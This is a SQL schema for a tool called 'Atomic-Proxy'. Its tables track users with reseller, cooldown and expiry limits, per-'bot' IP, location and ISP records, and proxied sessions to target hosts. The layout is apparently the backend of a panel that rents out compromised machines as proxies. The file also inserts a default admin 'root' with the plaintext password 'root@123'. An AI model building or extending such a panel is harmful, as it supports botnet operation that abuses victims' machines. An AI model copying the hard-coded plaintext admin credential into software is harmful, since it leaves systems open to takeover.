-- Atomic-Proxy Database Schema

-- Users table
CREATE TABLE IF NOT EXISTS `users` (
  `id` INTEGER PRIMARY KEY AUTOINCREMENT,
  `username` TEXT NOT NULL UNIQUE,
  `password` TEXT NOT NULL,
  `admin` INTEGER NOT NULL DEFAULT 0,
  `reseller` INTEGER NOT NULL DEFAULT 0,
  `newuser` INTEGER NOT NULL DEFAULT 1,
  `api` INTEGER NOT NULL DEFAULT 0,
  `maxtime` INTEGER NOT NULL DEFAULT 120,
  `cooldown` INTEGER NOT NULL DEFAULT 60,
  `conns` INTEGER NOT NULL DEFAULT 1,
  `max_daily` INTEGER NOT NULL DEFAULT 100,
  `expiry` INTEGER NOT NULL
);

-- Default admin user (password: root@123)
INSERT INTO users (username, password, admin, reseller, newuser, api, maxtime, cooldown, conns, max_daily, expiry)
VALUES ('root', 'root@123', 1, 1, 0, 1, 864000, 0, 10, 1000, 2147483647);

-- Proxy statistics table
CREATE TABLE IF NOT EXISTS `proxy_stats` (
  `id` INTEGER PRIMARY KEY AUTOINCREMENT,
  `bot_id` TEXT NOT NULL,
  `ip` TEXT NOT NULL,
  `port` INTEGER NOT NULL,
  `country` TEXT DEFAULT 'Unknown',
  `city` TEXT DEFAULT 'Unknown',
  `isp` TEXT DEFAULT 'Unknown',
  `connections_total` INTEGER DEFAULT 0,
  `connections_active` INTEGER DEFAULT 0,
  `bytes_sent` INTEGER DEFAULT 0,
  `bytes_received` INTEGER DEFAULT 0,
  `uptime` INTEGER DEFAULT 0,
  `status` TEXT DEFAULT 'idle',
  `last_seen` INTEGER NOT NULL,
  `created_at` INTEGER NOT NULL
);

CREATE INDEX IF NOT EXISTS idx_proxy_ip ON proxy_stats(ip);
CREATE INDEX IF NOT EXISTS idx_proxy_status ON proxy_stats(status);
CREATE INDEX IF NOT EXISTS idx_proxy_last_seen ON proxy_stats(last_seen);
CREATE INDEX IF NOT EXISTS idx_proxy_bot_id ON proxy_stats(bot_id);

-- Proxy activity logs
CREATE TABLE IF NOT EXISTS `proxy_logs` (
  `id` INTEGER PRIMARY KEY AUTOINCREMENT,
  `bot_id` TEXT NOT NULL,
  `action` TEXT NOT NULL,
  `details` TEXT,
  `timestamp` INTEGER NOT NULL
);

CREATE INDEX IF NOT EXISTS idx_logs_timestamp ON proxy_logs(timestamp);
CREATE INDEX IF NOT EXISTS idx_logs_bot_id ON proxy_logs(bot_id);

-- Proxy sessions tracking
CREATE TABLE IF NOT EXISTS `proxy_sessions` (
  `id` INTEGER PRIMARY KEY AUTOINCREMENT,
  `bot_id` TEXT NOT NULL,
  `client_ip` TEXT NOT NULL,
  `target_host` TEXT NOT NULL,
  `target_port` INTEGER NOT NULL,
  `bytes_sent` INTEGER DEFAULT 0,
  `bytes_received` INTEGER DEFAULT 0,
  `start_time` INTEGER NOT NULL,
  `end_time` INTEGER,
  `duration` INTEGER
);

CREATE INDEX IF NOT EXISTS idx_sessions_bot_id ON proxy_sessions(bot_id);
CREATE INDEX IF NOT EXISTS idx_sessions_start_time ON proxy_sessions(start_time);
